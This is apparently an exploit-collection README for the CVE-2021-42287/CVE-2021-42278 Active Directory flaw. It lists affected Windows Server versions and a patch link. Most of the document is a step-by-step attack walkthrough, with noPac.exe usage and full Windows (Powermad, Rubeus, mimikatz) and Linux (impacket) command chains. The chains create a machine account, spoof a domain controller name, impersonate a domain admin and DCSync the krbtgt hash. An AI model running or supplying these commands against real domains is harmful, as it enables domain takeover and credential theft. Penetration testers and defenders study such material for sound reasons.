### CVE-2021-42287

#### Describe

The CVE-2021-42287/CVE-2021-42278 combo box can pass the ordinary user authority account to win the Microsoft Windows Active Directory domain service administrator authority account

#### ImpactVersion

| Product             | CPU Architecture | Version | Update | Tested   |
| ------------------- | ---------------- | ------- | ------ | -------- |
| Windows Server 2008 | x86/x64          |         | SP2    |          |
| Windows Server 2008 | x64              | R2      | SP1    |          |
| Windows Server 2012 |                  |         |        | &#10004; |
| Windows Server 2012 |                  | R2      |        |          |
| Windows Server 2016 |                  |         |        |          |
| Windows Server 2019 |                  |         |        |          |
| Windows Server 2022 |                  |         |        |          |
| Windows Server      |                  | 2004    |        |          |
| Windows Server      |                  | 20H2    |        |          |

#### Patch

```
https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2021-42287
```

#### Utilization

CompilerEnvironment

- VS2019（.NET Framework 4.0）AnyCPU Release

> The demonstration uses the noPac project

Preconditions for exploiting vulnerabilities, and points to note

- Ability to add regular users of the machine (MachineAccountQuota defaults to 10, and a value of 0 means that regular users cannot create machine accounts and cannot directly exploit this vulnerability)

  <img src="https://raw.github.com/Ascotbe/Image/master/Kernelhub/CVE-2021-42287_0x01.png" alt="12" style="zoom:50%;" />

- There is also noPac, a tool that simulates the domain administrator, but if the user ptt does not exist in the domain administrator group, an error will be reported. You need to specify the administrator through `/IMPERSONATE domain_admin_user`, and the error is as follows

  ![image-20211214141231851](https://raw.github.com/Ascotbe/Image/master/Kernelhub/CVE-2021-42287_0x02.png)

First get the administrator account in the domain

```powershell
net group "domain admins" /domain
```

After obtaining the administrator account, execute the following command

```powershell
.\noPac.exe -domain <域名> -user <能添加普通账户的账号> -pass <能添加普通账户的密码>  /dc <域控机器>  /mAccount <你想添加到域中的账号> /mPassword <你想添加到域中的密码> /service <票据的服务名> /IMPERSONATE <获取到的域管理员账号> /ptt
```

Explain a few parameters, the bill service name generally uses cifs

```
domain name：cn.ascotbe.test.com
dc：DC1.cn.ascotbe.test.com
service：cifs
```

![image-20211214142856348](https://raw.github.com/Ascotbe/Image/master/Kernelhub/CVE-2021-42287_0x03.png)

Then verify by executing the following command

```powershell
#View bill
klist
#Obtain C drive file
dir \\dc\c$
```

![image-20211214143041849](https://raw.github.com/Ascotbe/Image/master/Kernelhub/CVE-2021-42287_0x04.png)

> Use the sam-the-admin project

No test, you can use -h to view the command

> Use the command line to execute

windows

```powershell
# 0. create a computer account
Import-Module .\Powermad.ps1

$password = ConvertTo-SecureString 'ComputerPassword' -AsPlainText -Force
New-MachineAccount -MachineAccount "ControlledComputer" -Password $($password) -Domain "domain.local" -DomainController "DomainController.domain.local" -Verbose

# 1. clear its SPNs
Set-DomainObject "CN=ControlledComputer,CN=Computers,DC=domain,DC=local" -Clear 'serviceprincipalname' -Verbose

# 2. rename the computer (computer -> DC)
Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "DomainController" -Attribute samaccountname -Verbose

# 3. obtain a TGT
Rubeus.exe asktgt /user:"DomainController" /password:"ComputerPassword" /domain:"domain.local" /dc:"DomainController.domain.local" /nowrap

# 4. reset the computer name
Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "ControlledComputer" -Attribute samaccountname -Verbose

# 5. obtain a service ticket with S4U2self by presenting the previous TGT
Rubeus.exe s4u /self /impersonateuser:"DomainAdmin" /altservice:"ldap/DomainController.domain.local" /dc:"DomainController.domain.local" /ptt /ticket:[Base64 TGT]

# 6. DCSync
(mimikatz) lsadump::dcsync /domain:domain.local /kdc:DomainController.domain.local /user:krbtgt
```

linux

```bash
# 0. create a computer account
addcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -dc-host DC01 -domain-netbios domain 'domain.local/user1:complexpassword'

# 1. clear its SPNs
addspn.py -u 'domain\user' -p 'password' -t 'ControlledComputer$' -c DomainController

# 2. rename the computer (computer -> DC)
renameMachine.py -current-name 'ControlledComputer$' -new-name 'DomainController' -dc-ip 'DomainController.domain.local' 'domain.local'/'user':'password'

# 3. obtain a TGT
getTGT.py -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController':'ComputerPassword'

# 4. reset the computer name
renameMachine.py -current-name 'DomainController' -new-name 'ControlledComputer$' 'domain.local'/'user':'password'

# 5. obtain a service ticket with S4U2self by presenting the previous TGT
KRB5CCNAME='DomainController.ccache' getST.py -self -impersonate 'DomainAdmin' -spn 'cifs/DomainController.domain.local' -k -no-pass -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController'

# 6. DCSync by presenting the service ticket
KRB5CCNAME='DomainAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt' -k -no-pass -dc-ip 'DomainController.domain.local' @'DomainController.domain.local'
```



#### ProjectSource

- [GhostPack](https://github.com/GhostPack/Rubeus)
- [Kevin-Robertson]( https://github.com/Kevin-Robertson/Powermad)
- [cube0x0](https://github.com/cube0x0/noPac)
- [sam-the-admin](https://github.com/WazeHell/sam-the-admin)

#### Analyze

- [CVE-2021-42287/CVE-2021-42278 Weaponisation](https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html)
